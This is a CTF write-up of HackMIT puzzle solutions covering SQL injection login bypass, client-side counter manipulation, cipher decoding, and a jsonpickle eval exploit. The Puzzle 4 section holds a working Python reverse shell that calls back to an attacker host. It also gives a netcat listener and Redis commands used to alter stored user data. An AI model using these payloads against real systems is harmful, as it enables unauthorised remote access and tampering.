
# HackMIT Puzzles Solution

## Entrypoint: Get puzzle link
I have seen many solutions on how to get the puzzle link, our particular solution was simply to open the Google/Firefox developer tools and print the variable named puzzle_link
```js
console.log(puzzle_link)
```
The result of that code gave us the following link, which is the dashboard of the puzzle
```
https://my.hackwsb.net
```
## Puzzle 1: GET DA COOKIES 🍪 🍪 🍪
![Puzzle view](https://i.imgur.com/DWQigrY.png)

The solution to this puzzle was a SQL injection. To be able to log in with the administrator's password without having it, we had to use the typical injection where at the end of the SQL query we insert a new condition that will help the query to always be true.
```sql
'or '1'='1
```
After executing the code, the web page will change and a counter like the following will appear:
![First puzzle after bypassing admin password](https://i.imgur.com/OqqImP3.png)
Then you have to click the cookie 5000 times. But that is very boring and slow, so, just open the developer tools and look for the onclick property of the cookie (you will find the function increments the counter by one).

Having found the function we will do a typical for loop to call that function 5000 times

```js
for (let i = 0; i < 5000; i++)
	counter('loremipsum_000000', 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
```
Once we reach 5000 cookies, we simply open the developer console and find our key.
```
Your secret key is: 0000000000000000000000000000000000000000000000000000000000000000
```
## Puzzle 2: Beavercoin TO the mooon 🚀 🚀 🚀
![Preview of the puzzle](https://i.imgur.com/hwwb02T.png)

The idea behind this puzzle was to decrypt all the "tweets", each "tweet" had a positive or negative impact with respect to the market.

The decryption of the tweets was based on the following algorithms (All algorithms can be found in the repository respectively):
- Hexadecimal
- Bacon
- Beaufort

The procedure we followed as a team was to open a Google Sheet and start noting in tables which tweets had positive and negative impact.

After we had a considerable amount of tweets, we did the following:
- If the tweet affected negatively, we sold everything.
- If the tweet had a positive impact, we bought everything

After doing that approximately 14 times, it gave you the money to be able to buy the key.

## Puzzle 3: Double Agent on WSB


## Puzzle 4: How to become a millionare in 12736 easy steps
![Puzzle 4 preview](https://i.imgur.com/o4tCien.png)Well, the solution to this puzzle is totally different from what the creators of the puzzle expected. While solving the puzzle we realized that the ``jsonpickle`` library could be injected with Python code thanks to a vulnerability. 

The vulnerability was that when the JSON was decoded it would decode into an ``.eval()``, allowing us to execute arbitrary code from the server.

The code we decided to run was a reverse shell (running directly in Python):
```python
CODE = """
import socket, os, pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((SERVER_IP, 4242))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("\\x2f" + "bin" + "\\x2f" + "sh")
""".strip().replace("\n", ";")
```

Before executing the code shown we had to have a netcat listener in order to receive the connection.

We could have used the following code on any Linux computer
```sh
nc -lvp 4242
```
Having access to the server, simply connect to the Redis server with the Telnet protocol
```sh
telnet 127.0.0.1 6379
```

Having access to the database, we select database 0 and ask for our user's data.
```sh
select 0
get loremipsum_000000
```
This will give us a JSON. When we do that we will change the value of our user for the one modified by us, which will have the necessary coins to pass the puzzle.

```sh
set loremipsum_000000 'HERE YOU SHOULD PLACE YOUR MODIFIED JSON'
```
Doing this procedure the only thing left to do would be to go to your ``exchange.py`` and donate to get the key.

## Puzzle 5: WE LOVE CHAD 🌙
